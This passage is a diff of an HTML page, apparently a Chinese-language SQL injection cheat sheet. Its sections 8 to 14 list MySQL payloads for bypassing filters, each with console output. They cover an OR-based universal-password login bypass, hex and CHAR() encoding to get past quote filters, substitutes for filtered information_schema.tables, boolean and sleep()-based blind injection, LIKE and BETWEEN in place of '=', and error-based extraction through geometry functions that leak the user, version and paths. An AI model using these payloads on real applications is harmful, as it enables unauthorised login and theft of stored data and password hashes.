class="p">,</span> <span class="k">IS</span><span class="p">,</span> <span class="k">NOT</span><span class="p">,</span> <span class="k">BETWEEN</span><span class="p">,</span> <span class="p">...</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="8-万能密码之or-and优先级">8.万能密码之or and优先级</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;nouser&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="c1">-- - and password=&#39;123&#39;;
+</span><span class="c1"></span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;nouser&#39;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;123&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="9-过滤引号">9.过滤引号</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="mi">0</span><span class="n">x61646d696e</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="10-过滤tables">10.过滤tables</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">partitions</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="k">TABLE_NAME</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">test</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="k">statistics</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="k">TABLE_NAME</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">test</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">table_constraints</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="k">table_name</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">test</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">KEY_COLUMN_USAGE</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="k">table_name</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">test</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="11-过滤select">11.过滤select</h3>
+
+<p>(布尔|延时)盲注即可,也可以参考第6条</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">116</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">116</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="n">Time</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">081</span><span class="n">s</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="12-过滤union">12.过滤union</h3>
+
+<p>盲注或者子查询猜解.最好还是编写脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">2</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="13-过滤">13. 过滤=</h3>
+
+<p><code>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span> <span class="k">between</span> <span class="mi">0</span><span class="n">x61</span> <span class="k">and</span> <span class="mi">0</span><span class="n">x7a</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+------------------------------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                                             <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+------------------------------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span>                     <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="n">CHARACTER_SETS</span>                                       <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="n">COLLATION_CHARACTER_SET_APPLICABILITY</span>                <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="n">COLLATIONS</span>                                           <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="n">COLUMN_PRIVILEGES</span>                                    <span class="o">|</span>
+<span class="p">...................</span><span class="k">between</span> <span class="nb">char</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="k">and</span> <span class="nb">char</span><span class="p">(</span><span class="mi">122</span><span class="p">).......................</span>
+<span class="o">+</span><span class="c1">----+----------+------------------------------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span> <span class="k">like</span> <span class="mi">2</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span> <span class="k">like</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span> <span class="k">between</span> <span class="s1">&#39;u&#39;</span> <span class="k">and</span> <span class="s1">&#39;v&#39;</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---+---+-----------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="k">TABLE_NAME</span>      <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+-----------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">USER_PRIVILEGES</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+-----------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span> <span class="k">like</span> <span class="s1">&#39;u%&#39;</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---+---+------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="k">TABLE_NAME</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">users</span>      <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span> <span class="o">&gt;</span> <span class="s1">&#39;u&#39;</span> <span class="k">and</span> <span class="k">table_name</span> <span class="o">&lt;</span> <span class="s1">&#39;v&#39;</span> <span class="k">limit</span> <span class="mi">10</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---+---+--------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="k">TABLE_NAME</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+--------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">user_summary</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+--------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="14-过滤updatexml及extractvalue">14.过滤updatexml及extractvalue</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">polygon</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>user()</code> from (select &lsquo;root@localhost&rsquo; AS <code>user()</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">GeometryCollection</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">version</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>version()</code> from (select &lsquo;5.5.44-0ubuntu0.14.04.1&rsquo; AS <code>version()</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multipoint</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">@@</span><span class="n">basedir</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>@@basedir</code> from (select &lsquo;/usr&rsquo; AS <code>@@basedir</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multilinestring</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">database</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>database()</code> from (select &lsquo;test&rsquo; AS <code>database()</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">LINESTRING</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">@@</span><span class="n">version_compile_os</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>@@version_compile_os</code> from (select &lsquo;debian-linux-gnu&rsquo; AS <code>@@version_compile_os</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
